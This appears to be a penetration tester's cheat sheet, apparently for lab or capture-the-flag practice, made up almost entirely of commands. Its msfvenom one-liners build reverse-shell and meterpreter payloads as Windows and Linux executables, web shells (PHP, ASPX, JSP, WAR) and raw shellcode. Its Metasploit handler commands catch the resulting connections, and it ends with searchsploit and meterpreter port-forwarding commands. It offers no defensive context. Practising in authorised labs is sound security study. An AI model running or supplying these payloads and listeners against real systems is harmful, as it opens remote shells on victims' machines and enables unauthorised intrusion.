## MSFVenom
### Binaries
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=6666 -f exe -o 6shell.exe

msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=tun0 LPORT=5555 -f elf > shell.elf

msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=1337 -f jar > payload.jar

# Linux reverse shell - Staged
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell
# Linux reverse shell - Stageless
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell

# Windows reverse shell - Staged
msfvenom -p windows/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o reverse.exe
# Windows reverse shell - Stageless
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o reverse.exe
```

### Web
```bash
# PHP
msfvenom -p php/reverse_php 

# ASPX
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f aspx -o shell.aspx

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war
```

### Shellcode

Select appropriate architecture
```bash
# Linux Staged - use python or c
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f python
# Linux Stageless - use python or c
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f python

# Windows Staged - use python or c
msfvenom -p windows/x64/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f python
# Windows Stageless - use python or c
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f python
```
## MSFConsole
```bash
set PAYLOAD java/meterpreter/reverse_tcp

sudo msfconsole

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 6666
exploit

sessions -u 1
```

## SearchSploit
```bash
searchsploit [software/version]
```
### Port Forwarding
```bash 
portfwd add -R -L 0.0.0.0 -l 80 -p 8080 -r 0.0.0.0

portfwd del -l 80 -p 8080 -r 127.0.0.1 -R
```